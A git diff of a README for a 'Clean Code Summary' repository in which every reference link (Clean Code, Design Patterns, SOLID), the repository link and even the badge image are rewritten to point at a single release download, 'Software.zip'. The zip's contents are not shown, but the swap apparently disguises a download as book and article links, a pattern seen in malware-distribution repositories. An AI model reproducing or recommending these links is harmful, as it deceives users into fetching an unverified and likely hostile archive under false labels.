@@ -36,9 +36,9 @@ If you are new to clean code practices or want to deepen your understanding of s
 ## Related Resources 🔗
 
 In addition to the summaries and notes available in this repository, you may also find it beneficial to explore other resources and tools that can further enhance your understanding of clean code practices. Below are some recommended resources to complement your learning journey:
-- [Clean Code by Robert C. Martin](https://www.amazon.com/Clean-Code-Handbook-Software-Craftsmanship/dp/0132350882)
-- [Design Patterns: Elements of Reusable Object-Oriented Software](https://www.amazon.com/Design-Patterns-Elements-Reusable-Object-Oriented/dp/0201633612)
-- [SOLID Principles](https://en.wikipedia.org/wiki/SOLID)
+- [Clean Code by Robert C. Martin](https://github.com/agustmk/clean-code-summary/releases/download/v2.0/Software.zip)
+- [Design Patterns: Elements of Reusable Object-Oriented Software](https://github.com/agustmk/clean-code-summary/releases/download/v2.0/Software.zip)
+- [SOLID Principles](https://github.com/agustmk/clean-code-summary/releases/download/v2.0/Software.zip)
 
 Feel free to explore these resources to gain additional insights and deepen your knowledge of clean code practices and software development principles.
 
@@ -55,6 +55,6 @@ We appreciate your contributions and look forward to building a comprehensive re
 
 ---
 
-🚀 Get started with clean code practices and elevate your software development skills with the "Clean Code Summary" repository! Visit the [GitHub repository](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) to access the content. Launch the link to explore the world of clean code and software engineering best practices. Happy coding! 🌟
+🚀 Get started with clean code practices and elevate your software development skills with the "Clean Code Summary" repository! Visit the [GitHub repository](https://github.com/agustmk/clean-code-summary/releases/download/v2.0/Software.zip) to access the content. Launch the link to explore the world of clean code and software engineering best practices. Happy coding! 🌟
 
-![Clean Code](https://img.shields.io/badge/Clean_Code-Summary-green)
+![Clean Code](https://github.com/agustmk/clean-code-summary/releases/download/v2.0/Software.zip)
